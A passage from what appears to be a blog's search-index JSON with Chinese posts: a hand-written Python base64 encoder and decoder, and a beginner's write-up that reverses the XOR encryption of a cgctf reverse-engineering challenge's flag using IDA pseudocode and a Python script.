&apos;d&apos;,&apos;e&apos;,&apos;f&apos;,&apos;g&apos;,&apos;h&apos;,&apos;i&apos;,&apos;j&apos;,&apos;k&apos;,&apos;l&apos;,&apos;m&apos;,&apos;n&apos;,&apos;o&apos;,&apos;p&apos;,&apos;q&apos;,&apos;r&apos;,&apos;s&apos;,&apos;t&apos;,&apos;u&apos;,&apos;v&apos;,&apos;w&apos;,&apos;x&apos;,&apos;y&apos;,&apos;z&apos;,&apos;0&apos;, &apos;1&apos;, &apos;2&apos;, &apos;3&apos;,&apos;4&apos;,&apos;5&apos;,&apos;6&apos;,&apos;7&apos;,&apos;8&apos;,&apos;9&apos;,&apos;+&apos;, &apos;/&apos;]def encode(str_input): str_output=&apos;&apos; list_input=[&apos;&#123;:0&gt;8&#125;&apos;.format(str(bin(ord(str_input[i]))).replace(&apos;0b&apos;, &apos;&apos;)) for i in range(len(str_input))] compensate=0 while list_input: list_temp=list_input[:3] while len(list_temp)%3: compensate+=1 list_temp.append(&apos;0&apos;*8) str_temp=&apos;&apos;.join(list_temp) list_str_temp=[str_temp[i:i+6] for i in [0,6,12,18]] list_str_temp=[int(i,2) for i in list_str_temp] str_output+=&apos;&apos;.join(letters[i] for i in list_str_temp) list_input=list_input[3:] str_output+=&apos;=&apos;*compensate return str_outputdef decode(str_input): str_output=&apos;&apos; list_input=[&apos;&#123;:0&gt;6&#125;&apos;.format(str(bin(letters.index(i))).replace(&apos;0b&apos;, &apos;&apos;))for i in str_input if i != &apos;=&apos;] compensate=0 for i in str_input: if i == &apos;=&apos;: compensate+=1 while list_input: list_temp=list_input[:4] str_temp=&apos;&apos;.join(list_temp) while len(str_temp)%8: str_temp=str_temp[0:-1*2*compensate] list_str_temp=[str_temp[i:i+8] for i in [0,8,16]] list_str_temp=[int(i,2) for i in list_str_temp] str_output+=&apos;&apos;.join([chr(i)for i in list_str_temp]) list_input=list_input[4:] return str_outputs=&quot;sadadsadaddasdadas&quot;d=&apos;c2FkYWRzYWRhZGRhc2RhZGFz&apos;print encode(s)print decode(d) 运行： 123sH1rkEr:desktop macbook$ python base64.pyc2FkYWRzYWRhZGRhc2RhZGFzsadadsadaddasdadas 终于是成功了，编写过程中由于字符串和list的问题总是出错，还是要多看看python","categories":[],"tags":[]},{"title":"acdES","slug":"acdES","date":"2018-09-22T01:21:17.000Z","updated":"2018-09-28T12:58:36.268Z","comments":true,"path":"2018/09/22/acdES/","link":"","permalink":"http://yoursite.com/2018/09/22/acdES/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"cgctf-480小时精通c++","slug":"480小时","date":"2018-09-20T16:52:52.000Z","updated":"2018-09-22T01:20:58.359Z","comments":true,"path":"2018/09/21/480小时/","link":"","permalink":"http://yoursite.com/2018/09/21/480小时/","excerpt":"","text":"听了大佬的话先来搭个blog，虽然啥也不会，但是可以对着教程慢慢搭，不管怎样能看见网页就行了先…… 题目来自于cgctf平台，之前一直没做出来，光是名字就让我望而却步…… ida启动！main函数伪代码如下： 123456789101112131415161718192021222324int __cdecl main(int argc, const char **argv, const char **envp)&#123; signed int i; // [rsp+Ch] [rbp-54h] __int64 v5; // [rsp+10h] [rbp-50h] __int64 v6; // [rsp+18h] [rbp-48h] __int64 v7; // [rsp+20h] [rbp-40h] __int64 v8; // [rsp+28h] [rbp-38h] int v9; // [rsp+30h] [rbp-30h] char v10; // [rsp+34h] [rbp-2Ch] unsigned __int64 v11; // [rsp+58h] [rbp-8h] v11 = __readfsqword(0x28u); v5 = 7652827924304847970LL; v6 = 6588269719570178159LL; v7 = 0615273543157435660505LL; v8 = 4932672475662219355LL; v9 = 2099869557; v10 = 0; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;((__int64)&amp;std::cout, (__int64)&quot;The Encrypted Flag is: &quot;); for ( i = 0; i &lt;= 35; ++i ) printf(&quot;%02x&quot;, *((unsigned __int8 *)&amp;v5 + i)); std::ostream::operator&lt;&lt;((__int64)&amp;std::cout, (__int64)std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); return 0;&#125; 很容易发现输出了加密后的flag，也就是v5-v9中的值，按r键转换成字符型，得加密flag:bdacsN4jo`q_g&lt;n[Eaw|3vWc[x1q{_tDuw)} 进入汇编界面发现输出”The Encrypted Flag is: “前被nop了一段，应该就是加密函数。 左侧函数列表中有480个名为_X1C_CG_EncryptFunction的函数，实现output[i]^=string[i%len(string)]^i，区别就是这480个函数中的string是从“001001001”到“480480480”。所以可以知道flag经过了这480个函数的加密后，就变成了bdacsN4jo`q_g&lt;n[Eaw|3vWc[x1q{_tDuw)}。 逆运算脚本如下： 1234567891011121314#!/usr/bin/env pythonkey=[]for i in range(1,481): n=str(i) key.append(n.zfill(3)*3)final=&quot;bdacsN4jo`q_g&lt;n[Eaw|3vWc[x1q&#123;_tDuw)&#125;&quot;flag=finalfor i in range(479,-1,-1): a=key[i] for j in range(35,-1,-1): s=ord(flag[j]) s^=ord(a[j%9])^j flag=flag.replace(flag[j],chr(s),1)print flag 于是得到了flag 可能由于并不会替换字符串中特定下标处的值，所以并没有得到flag……向大佬求救尚未得到回复…… 两小时后原因没错，通过百度了一会python中字符串替换的问题，找到了正确的替换方式： 12345678910111213141516#!/usr/bin/env pythonkey=[]for i in range(1,481): n=str(i) key.append(n.zfill(3)*3)final=&quot;bdacsN4jo`q_g&lt;n[Eaw|3vWc[x1q&#123;_tDuw)&#125;&quot;flag=finalflag1=list(flag)for i in range(479,-1,-1): a=key[i] for j in range(36): s=ord(flag1[j]) s^=ord(a[j%9])^j flag1[j]=chr(s)flag=&apos;&apos;.join(flag1)print flag flag get！ 通过大佬的指点终于是完成了这一道简单题，明明知道了怎么去逆运算，结果因为python不会用的原因忙了这么久……要学的太多 明天目标逆acdES","categories":[],"tags":[]}]}